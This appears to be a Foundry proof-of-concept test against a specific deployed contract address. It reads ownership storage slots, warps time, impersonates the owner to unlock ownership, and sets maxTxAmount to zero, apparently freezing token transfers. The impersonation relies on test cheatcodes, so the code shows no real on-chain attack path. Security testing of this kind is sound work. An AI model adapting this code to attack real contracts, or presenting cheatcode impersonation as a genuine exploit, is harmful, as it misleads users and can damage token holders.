pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGoodDAO {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function maxTxAmount() external view returns (uint256);
    function unlock() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x048FFa8aAE293470932388b615A90A8265bFB25F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        IGoodDAO target = IGoodDAO(TARGET);

        // Reading owner from the contract
        address currentOwner = target.owner();

        // Check if ownership has been locked
        if (currentOwner == address(0)) {
            // If locked, we need to unlock it first.
            // Ownable storage layout: _owner (slot 0), _previousOwner (slot 1), _lockTime (slot 2)
            bytes32 prevOwnerSlotData = vm.load(TARGET, bytes32(uint256(1)));
            bytes32 lockTimeSlotData = vm.load(TARGET, bytes32(uint256(2)));

            address previousOwner = address(uint160(uint256(prevOwnerSlotData)));
            uint256 lockTime = uint256(lockTimeSlotData);

            // We must have a previous owner to be able to unlock
            require(previousOwner != address(0), "Cannot unlock without a previous owner");

            // Move time forward past the lock time
            vm.warp(lockTime + 1);

            // Impersonate the previous owner to unlock and then execute the main exploit call
            vm.startPrank(previousOwner);
            target.unlock();
            target.setMaxTxAmount(0);
            vm.stopPrank();
        } else {
            // If not locked, the original exploit logic is fine.
            vm.prank(currentOwner);
            target.setMaxTxAmount(0);
        }
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

